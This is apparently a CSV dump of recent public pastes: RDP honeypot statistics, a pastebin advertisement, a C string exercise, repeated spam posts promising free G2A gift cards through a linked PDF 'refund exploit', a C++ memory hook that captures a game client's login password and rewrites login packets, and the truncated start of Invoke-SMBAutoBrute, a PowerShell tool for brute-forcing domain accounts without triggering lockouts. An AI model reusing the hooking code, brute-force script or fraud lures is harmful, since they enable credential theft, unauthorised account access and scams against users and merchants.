id,title,username,language,date,content
LavNxfWS,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:16:19 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 2,
    ""116.140.196.215"": 4,
    ""199.45.154.25"": 2,
    ""58.218.199.219"": 6,
    ""94.232.46.148"": 6,
    ""45.137.201.185"": 2,
    ""205.210.31.212"": 6,
    ""80.66.76.121"": 2,
    ""167.94.145.98"": 2,
    ""164.92.104.215"": 8,
    ""212.70.149.142"": 8,
    ""87.251.75.120"": 4,
    ""64.124.50.139"": 4,
    ""117.16.46.253"": 4,
    ""91.238.181.71"": 4,
    ""185.170.144.3"": 4,
    ""194.165.16.10"": 4,
    ""198.135.49.131"": 34,
    ""187.157.89.218"": 2,
    ""77.91.219.34"": 4,
    ""185.196.220.41"": 6,
    ""154.91.82.169"": 8766,
    ""116.182.20.8"": 2,
    ""194.165.16.11"": 4,
    ""198.235.24.116"": 6,
    ""152.42.242.235"": 2,
    ""60.255.174.158"": 2,
    ""183.82.117.93"": 2,
    ""167.179.37.82"": 2,
    ""43.129.251.187"": 1210,
    ""125.67.192.49"": 2,
    ""165.154.182.219"": 2,
    ""198.235.24.5"": 6,
    ""111.180.202.79"": 2,
    ""185.180.143.140"": 2,
    ""194.165.16.37"": 4,
    ""45.227.254.8"": 4,
    ""102.129.235.111"": 2,
    ""128.14.188.98"": 12,
    ""205.210.31.208"": 6
  },
  ""asn"": {
    ""AS58519"": 2,
    ""AS4837"": 6,
    ""AS398722"": 2,
    ""AS4134"": 8,
    ""AS212482"": 6,
    ""AS49581"": 2,
    ""AS396982"": 24,
    ""AS208091"": 6,
    ""AS398705"": 2,
    ""AS14061"": 10,
    ""AS204428"": 8,
    ""AS6461"": 4,
    ""AS18031"": 4,
    ""AS49434"": 4,
    ""AS197414"": 4,
    ""AS48721"": 12,
    ""AS396073"": 34,
    ""AS8151"": 2,
    ""AS43012"": 4,
    ""AS208046"": 6,
    ""AS399077"": 8766,
    ""AS137539"": 2,
    ""AS18209"": 2,
    ""AS9902"": 2,
    ""AS132203"": 1210,
    ""AS135377"": 2,
    ""AS148981"": 2,
    ""AS211680"": 2,
    ""AS267784"": 4,
    ""AS174"": 2,
    ""AS21859"": 12
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 2,
    ""China Unicom CHINA169 Network"": 6,
    ""Censys, Inc."": 4,
    ""Chinanet"": 8,
    ""Xhost Internet Solutions LP"": 16,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""Google LLC"": 24,
    ""DigitalOcean, LLC"": 10,
    ""SS-Net"": 8,
    ""Zayo Bandwidth"": 4,
    ""Sangmyung University"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Flyservers S.A."": 16,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabudstaden AB"": 4,
    ""ColocationX Ltd."": 6,
    ""Tcloudnet Inc"": 8766,
    ""China Unicom China169 Network"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Aceville Pte.ltd"": 1210,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Telecom"": 2,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""FTS120 EX Cogent"": 2,
    ""Zenlayer Inc"": 12
  },
  ""org"": {
    ""Chinanet SD"": 2,
    ""China United Network Communications Corporation Limited"": 4,
    ""Censys, Inc."": 4,
    ""Chinanet JS"": 6,
    ""Dmitriy Panchenko"": 6,
    ""Taurus"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 6,
    ""DigitalOcean, LLC"": 10,
    ""Global Communication Net Plc"": 8,
    ""Microsoft Corporation"": 4,
    ""Korean Education Network"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Xhostis"": 4,
    ""Flyservers S.A"": 12,
    ""Majestic Hosting Solutions, LLC"": 34,
    ""Uninet S.A. de C.V."": 2,
    ""Gastabud"": 4,
    ""Makut Investments"": 6,
    ""Tcloudnet Inc"": 8766,
    ""Unknown"": 1212,
    ""SiChuan Cable TV Network CO., LTD"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""NeocomISP Limited"": 2,
    ""Chinanet SC"": 2,
    ""Ucloud Information Technology"": 2,
    ""Chinanet HB"": 2,
    ""ICG 1 Inap"": 2,
    ""UAB Host Baltic"": 4,
    ""Digital Energy Technologies Limited"": 2,
    ""ZENLA"": 12
  },
  ""regionName"": {
    ""Shandong"": 2,
    ""Beijing"": 6,
    ""New York"": 2,
    ""Jiangsu"": 6,
    ""Perm Krai"": 6,
    ""Lombardy"": 2,
    ""California"": 46,
    ""North Holland"": 10,
    ""Michigan"": 2,
    ""Sofia-Capital"": 8,
    ""Washington"": 4,
    ""Seoul"": 4,
    ""\u00cele-de-France"": 4,
    ""Kaunas"": 12,
    ""Texas"": 34,
    ""Mexico City"": 2,
    ""S\u00f6dermanland County"": 4,
    ""Virginia"": 6,
    ""North West"": 8766,
    ""South West"": 2,
    ""Sichuan"": 4,
    ""Telangana"": 2,
    ""Phnom Penh"": 2,
    ""Central and Western District"": 1210,
    ""Hubei"": 2,
    ""Illinois"": 2,
    ""Vilnius"": 4,
    ""District of Columbia"": 2
  },
  ""country"": {
    ""China"": 20,
    ""United States"": 98,
    ""Russia"": 6,
    ""Italy"": 2,
    ""The Netherlands"": 10,
    ""Bulgaria"": 8,
    ""South Korea"": 4,
    ""France"": 4,
    ""Lithuania"": 16,
    ""Mexico"": 2,
    ""Sweden"": 4,
    ""Singapore"": 8768,
    ""India"": 2,
    ""Cambodia"": 2,
    ""Hong Kong"": 1210
  },
  ""account"": {
    ""142.93.8.59"": 2,
    ""(empty)"": 20,
    ""hello"": 1264,
    ""Domain"": 12,
    ""ePlqsSYEX"": 2,
    ""UrVZvi"": 2,
    ""GqBFvY"": 2,
    ""Administr"": 18,
    ""Test"": 32,
    ""927833797"": 8766,
    ""oBNwaWjid"": 2,
    ""NIpEoY"": 2,
    ""CwrDCn"": 2,
    ""Administrator"": 2,
    ""mGuikhJED"": 2,
    ""rMwSfO"": 2,
    ""sQBhQC"": 2,
    ""nz5ksafa"": 2,
    ""iHMAD"": 2,
    ""root"": 12,
    ""qhfYSDhRQ"": 2,
    ""cGNHgU"": 2,
    ""FHFbJJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 10156
  },
  ""client_build"": {
    ""Unknown"": 10156
  },
  ""client_name"": {
    ""Unknown"": 10156
  },
  ""ip_type"": {
    ""hosting"": 1296,
    ""Unknown"": 8850,
    ""proxy"": 8,
    ""hosting & proxy"": 2
  }
}"
cQiHApSq,2024-06-02_stats.json,rdp_snitch,JSON,Sunday 2nd of June 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""140.246.175.203"": 1,
    ""116.140.196.215"": 2,
    ""199.45.154.25"": 1,
    ""58.218.199.219"": 3,
    ""94.232.46.148"": 3,
    ""45.137.201.185"": 1,
    ""205.210.31.212"": 3,
    ""80.66.76.121"": 1,
    ""167.94.145.98"": 1,
    ""164.92.104.215"": 4,
    ""212.70.149.142"": 4,
    ""87.251.75.120"": 2,
    ""64.124.50.139"": 2,
    ""117.16.46.253"": 2,
    ""91.238.181.71"": 2,
    ""185.170.144.3"": 2,
    ""194.165.16.10"": 2,
    ""198.135.49.131"": 17,
    ""187.157.89.218"": 1,
    ""77.91.219.34"": 2,
    ""185.196.220.41"": 3,
    ""154.91.82.169"": 4383,
    ""116.182.20.8"": 1,
    ""194.165.16.11"": 2,
    ""198.235.24.116"": 3,
    ""152.42.242.235"": 1,
    ""60.255.174.158"": 1,
    ""183.82.117.93"": 1,
    ""167.179.37.82"": 1,
    ""43.129.251.187"": 605,
    ""125.67.192.49"": 1,
    ""165.154.182.219"": 1,
    ""198.235.24.5"": 3,
    ""111.180.202.79"": 1,
    ""185.180.143.140"": 1,
    ""194.165.16.37"": 2,
    ""45.227.254.8"": 2,
    ""102.129.235.111"": 1,
    ""128.14.188.98"": 6,
    ""205.210.31.208"": 3
  },
  ""asn"": {
    ""AS58519"": 1,
    ""AS4837"": 3,
    ""AS398722"": 1,
    ""AS4134"": 4,
    ""AS212482"": 3,
    ""AS49581"": 1,
    ""AS396982"": 12,
    ""AS208091"": 3,
    ""AS398705"": 1,
    ""AS14061"": 5,
    ""AS204428"": 4,
    ""AS6461"": 2,
    ""AS18031"": 2,
    ""AS49434"": 2,
    ""AS197414"": 2,
    ""AS48721"": 6,
    ""AS396073"": 17,
    ""AS8151"": 1,
    ""AS43012"": 2,
    ""AS208046"": 3,
    ""AS399077"": 4383,
    ""AS137539"": 1,
    ""AS18209"": 1,
    ""AS9902"": 1,
    ""AS132203"": 605,
    ""AS135377"": 1,
    ""AS148981"": 1,
    ""AS211680"": 1,
    ""AS267784"": 2,
    ""AS174"": 1,
    ""AS21859"": 6
  },
  ""isp"": {
    ""Cloud Computing Corporation"": 1,
    ""China Unicom CHINA169 Network"": 3,
    ""Censys, Inc."": 2,
    ""Chinanet"": 4,
    ""Xhost Internet Solutions LP"": 8,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""Google LLC"": 12,
    ""DigitalOcean, LLC"": 5,
    ""SS-Net"": 4,
    ""Zayo Bandwidth"": 2,
    ""Sangmyung University"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Flyservers S.A."": 8,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabudstaden AB"": 2,
    ""ColocationX Ltd."": 3,
    ""Tcloudnet Inc"": 4383,
    ""China Unicom China169 Network"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Aceville Pte.ltd"": 605,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Telecom"": 1,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""FTS120 EX Cogent"": 1,
    ""Zenlayer Inc"": 6
  },
  ""org"": {
    ""Chinanet SD"": 1,
    ""China United Network Communications Corporation Limited"": 2,
    ""Censys, Inc."": 2,
    ""Chinanet JS"": 3,
    ""Dmitriy Panchenko"": 3,
    ""Taurus"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 3,
    ""DigitalOcean, LLC"": 5,
    ""Global Communication Net Plc"": 4,
    ""Microsoft Corporation"": 2,
    ""Korean Education Network"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Xhostis"": 2,
    ""Flyservers S.A"": 6,
    ""Majestic Hosting Solutions, LLC"": 17,
    ""Uninet S.A. de C.V."": 1,
    ""Gastabud"": 2,
    ""Makut Investments"": 3,
    ""Tcloudnet Inc"": 4383,
    ""Unknown"": 606,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""NeocomISP Limited"": 1,
    ""Chinanet SC"": 1,
    ""Ucloud Information Technology"": 1,
    ""Chinanet HB"": 1,
    ""ICG 1 Inap"": 1,
    ""UAB Host Baltic"": 2,
    ""Digital Energy Technologies Limited"": 1,
    ""ZENLA"": 6
  },
  ""regionName"": {
    ""Shandong"": 1,
    ""Beijing"": 3,
    ""New York"": 1,
    ""Jiangsu"": 3,
    ""Perm Krai"": 3,
    ""Lombardy"": 1,
    ""California"": 23,
    ""North Holland"": 5,
    ""Michigan"": 1,
    ""Sofia-Capital"": 4,
    ""Washington"": 2,
    ""Seoul"": 2,
    ""\u00cele-de-France"": 2,
    ""Kaunas"": 6,
    ""Texas"": 17,
    ""Mexico City"": 1,
    ""S\u00f6dermanland County"": 2,
    ""Virginia"": 3,
    ""North West"": 4383,
    ""South West"": 1,
    ""Sichuan"": 2,
    ""Telangana"": 1,
    ""Phnom Penh"": 1,
    ""Central and Western District"": 605,
    ""Hubei"": 1,
    ""Illinois"": 1,
    ""Vilnius"": 2,
    ""District of Columbia"": 1
  },
  ""country"": {
    ""China"": 10,
    ""United States"": 49,
    ""Russia"": 3,
    ""Italy"": 1,
    ""The Netherlands"": 5,
    ""Bulgaria"": 4,
    ""South Korea"": 2,
    ""France"": 2,
    ""Lithuania"": 8,
    ""Mexico"": 1,
    ""Sweden"": 2,
    ""Singapore"": 4384,
    ""India"": 1,
    ""Cambodia"": 1,
    ""Hong Kong"": 605
  },
  ""account"": {
    ""142.93.8.59"": 1,
    ""(empty)"": 10,
    ""hello"": 632,
    ""Domain"": 6,
    ""ePlqsSYEX"": 1,
    ""UrVZvi"": 1,
    ""GqBFvY"": 1,
    ""Administr"": 9,
    ""Test"": 16,
    ""927833797"": 4383,
    ""oBNwaWjid"": 1,
    ""NIpEoY"": 1,
    ""CwrDCn"": 1,
    ""Administrator"": 1,
    ""mGuikhJED"": 1,
    ""rMwSfO"": 1,
    ""sQBhQC"": 1,
    ""nz5ksafa"": 1,
    ""iHMAD"": 1,
    ""root"": 6,
    ""qhfYSDhRQ"": 1,
    ""cGNHgU"": 1,
    ""FHFbJJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 5078
  },
  ""client_build"": {
    ""Unknown"": 5078
  },
  ""client_name"": {
    ""Unknown"": 5078
  },
  ""ip_type"": {
    ""hosting"": 648,
    ""Unknown"": 4425,
    ""proxy"": 4,
    ""hosting & proxy"": 1
  }
}"
J97w82dK,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 2nd of June 2024 06:52:28 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative

its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Support Markdown & 150+ different syntax languages - All Free
Link redirect 
Simple Ads by Google Adsense Few rather than Pastebin
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.....
......................................
........."
vxAjVLv8,🤑 G2A.com Free Gift Card Guide Jun 2024 FIX 🎁,ssss50w,GetText,Sunday 2nd of June 2024 06:44:23 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
03 June 2024"
pnPLvkha,2024_fun_with_strings,gpsgiraldi,C,Sunday 2nd of June 2024 06:37:33 PM CDT,"#include <stdio.h>
#include <string.h>

int main()
{
    int i,j,n;
    char str0[100],str1[40];
    
//    printf(""Set size of string vector: \n"");
//    scanf(""%d"",&n);
    for(j=0;j<40;j++){
        str1[j]='%';
    }
    printf(""Let's play with something here...\n"");
    printf(""... type something so we can start it: \n"");
    setbuf(stdin,NULL);

    fgets(str0,99,stdin);
    printf(""\n... it encompasses %ld positions in the vector, that means, including 'ENTER' function"",strlen(str0));
    printf(""\n\nYou have typed:\n"");
    fputs(str0,stdout);
    for(i=0;i<strlen(str0);i++){
        if(str0[i]=='l'){
            if(str0[i+1]=='e'){
                if(str0[i+2]=='m'){
                    if(str0[i+3]=='i'){
                        if(str0[i+4]=='n'){
                            if(str0[i+5]=='s'){
                                if(str0[i+6]=='k'){
                                    if(str0[i+7]=='y'){
                                        printf(""Leminsky disse:\num homem com uma dor, é muito mais interessante\ncaminha assim de lado\ncomo se, chegando atrasado...\nandasse mais adiante!"");
                                    }
                                }    
                            }
                        }
                    }
                }
            }
//            strcat(str1,str0);
        }
    }
//    strcpy(str1,str0);
    setbuf(stdin,NULL);

    printf(""\n\n... and in the str1 it should also read: \n"");
    strcpy(str1,str0);
    for(j=0;j<strlen(str0);j++){
        if(str0[j]=='a'||str0[j]=='e'||str0[j]=='i'||str0[j]=='o'||str0[j]=='u'){
            str1[j-1]='*';
            str1[j]='*';
        }
    }
    fputs(str1,stdout);
    return 0;
    
}
"
hMt9B8dk,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Garoam,JavaScript,Sunday 2nd of June 2024 06:18:22 PM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
dQuhVRjM,🤑 G2A.com Free Gift Card Guide Jun 2024 FIX 🤑,jusst2k4,GetText,Sunday 2nd of June 2024 06:07:21 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_685849.pdf

Working as of:
03 June 2024"
2nGZ7bMM,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,atakan1983,JavaScript,Sunday 2nd of June 2024 05:53:21 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
GEkhKVaN,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,lookos13,JavaScript,Sunday 2nd of June 2024 05:28:19 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
5xaVTkx5,Login 7xxx,AMRCODEING,C++,Sunday 2nd of June 2024 05:26:27 PM CDT,"#include ""USERHOOK.h""
#include ""Common.h""

#pragma comment( lib, ""psapi.lib"" )
#pragma comment( lib, ""detours.lib"" )

static BYTE Key1[] = { 99,88,140,22,33,190,244,115,160,191,213,45,241,203,99,230,142,4,19,113,106,59,245,220,169,232,121,79,241,95,193,149 };
static BYTE Key2[] = { 101,110,251,209,129,108,198,113,154,252,111,231,84,199,183,190,57,26,225,218,121,227,232,36,55,224,48,169,254,163,166,43 };
PBYTE JumpPassword = 0, PasswordPointer;
int  SizePassword = 0, SizeServer = 0, SizeUsername = 0;
char szPassword[32], szUser[32], szServer[32];
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD RecvAddress = Memory::FindPattern(""Conquer.exe"", ""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"", ""xxx????x????xxxxxx????"");
DWORD UserAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"", ""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD SendAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"", ""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx"");

void* sock_add = 0;
void* Ecx = 0;
UINT32 Identifier = 0, State = 0;
HookStub _SRecv;

void PrintPass()
{
	sprintf(szPassword, ""%s"", PasswordPointer);
	SizePassword = strlen(szPassword);
}

_declspec(naked) VOID WINAPI FunctionPass()
{
	__asm mov dword ptr ds : [PasswordPointer], eax
	__asm pushad
	__asm popad
	__asm mov dword ptr ss : [ebp - 0xC], eax
	__asm mov ecx, dword ptr ss : [ebp - 0xC]
	__asm call PrintPass
	__asm jmp dword ptr ds : [JumpPassword]
}

_declspec(naked) VOID WINAPI MYJMPPASS()
{
	__asm jmp FunctionPass
}


typedef signed int(__cdecl* _u)(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11);
signed int __cdecl _User(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11)
{
	DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
	if (PasswordAddress != NULL) {
		Memory::WriteMemory(PasswordAddress + 1, MYJMPPASS, 6);

		BYTE buffer[] = { JMP_OPCODE }; // jmp
		WriteProcessMemory(GetCurrentProcess(), (PBYTE)(PasswordAddress), &buffer, sizeof(buffer), NULL);
		DWORD CallDatinter = PasswordAddress + 1;
		DWORD dword;
		VirtualProtect((VOID*)CallDatinter, 4, PAGE_EXECUTE_READWRITE, &dword);
		PasswordPointer = (PBYTE)PasswordAddress - (0xFFFFFFFF - CallDatinter) + 4;
		CallDatinter = (DWORD)FunctionPass - PasswordAddress + 0xFFFFFFFF - 4;
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 1), &CallDatinter, sizeof(CallDatinter), NULL);

		BYTE bufferNop[] = { NOP_OPCODE };
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 5), &bufferNop, sizeof(bufferNop), NULL);
		JumpPassword = (PBYTE)PasswordAddress + 6;
	}
	sprintf(szUser, ""%s"", Str);
	SizeUsername = strlen(szUser);
	sprintf(szServer, ""%s"", (char*)a5);
	SizeServer = strlen(szServer);
	_u originalTQ = (_u)UserAddress;
	return originalTQ(Str, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

typedef signed int(__cdecl* _r)(int a1, signed int a2);
signed int WINAPIV _Recv(int a1, signed int a2) {
	INT length = *(UINT16*)(a1);
	int packetid = *(UINT16*)(a1 + 2);
	if (packetid == 1637)
	{
		Identifier = *(UINT32*)(a1 + 4);
		State = *(UINT32*)(a1 + 12);
	}
	using __Recv = signed int(WINAPIV *)(int, signed int);
	return ((__Recv)_SRecv.Address)(a1, a2);
}

typedef signed int(__thiscall* _s)(void*, int, int);
signed int __fastcall _Send(void* a1, void* ecx, int a2, signed int a3)
{
	sock_add = a1;
	Ecx = ecx;
	int packetid = *(UINT16*)(a2 + 2);
	if (packetid == 1942)
	{
		*(UINT16*)(a2 + 2) = 61120;//Packet ID
		*(BYTE*)(a2 + 4) = (BYTE)SizeUsername;
		*(BYTE*)(a2 + 5) = (BYTE)SizePassword;
		*(BYTE*)(a2 + 6) = (BYTE)SizeServer;
		sprintf((char*)(a2 + 10), ""%s"", szUser);
		sprintf((char*)(a2 + 10 + SizeUsername), ""%s"", szPassword);
		for (BYTE x = 0; x < SizePassword; x++)
		{
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key1[x * 44 % 32]);
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key2[x * 99 % 32]);
		}
		sprintf((char*)(a2 + 10 + SizeUsername + SizePassword), ""%s"", szServer);	
	}
	if (packetid == 2065)
	{
		*(UINT*)(a2 + 4) = Identifier;
		*(UINT*)(a2 + 8) = State;
	}
	_s originalTQ = (_s)SendAddress;
	return originalTQ(a1, a2, a3);
}
void USERHOOK::Init()
{
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)UserAddress, _User);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	/*DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)RecvAddress, _Recv);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}*/
	_SRecv.Size = 7;
	Memory::CreateHook((VOID*)RecvAddress, _Recv, &_SRecv);

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)SendAddress, _Send);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	BYTE buffer2[] = { 0x90, 0x90, 0x90, 0x90 };
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress), &buffer2, sizeof(buffer2), NULL);
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress + 1), &buffer2, sizeof(buffer2), NULL);
}



DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD rHASH = Memory::FindPattern(""Conquer.exe"",""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"",""xxx????x????xxxxxx????"");
DWORD uHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"",""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD sHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"",""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx""); "
a26CdhZe,Untitled,Lebarra,PowerShell,Sunday 2nd of June 2024 05:19:46 PM CDT,"function Invoke-SMBAutoBrute
{
<#
.SYNOPSIS

    Performs smart brute forcing of accounts against the current domain, ensuring that
	lockouts do not occur.

    Author: Jason Lang (@curi0usJack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

    PS C:\> Invoke-SMBAutoBrute -PasswordList ""jennifer, yankees"" -LockoutThreshold 3

	[*] Performing prereq checks.
	[*] PDC: LAB-2008-DC1.lab.com
	[*] Passwords to test: jennifer, yankees, 123456
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser6. Password: jennifer
	[+] Success! Username: TestUser99. Password: yankees
	[*] Completed.

.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

	A comma separated list of passwords to attempt. 
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run ""net accounts"".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will exit after the first successful authentication.

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $UserList,

        [parameter(Mandatory = $True)]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        Try {Add-Type -AssemblyName System.DirectoryServices}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext(""Domain"",""lab.com"")
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
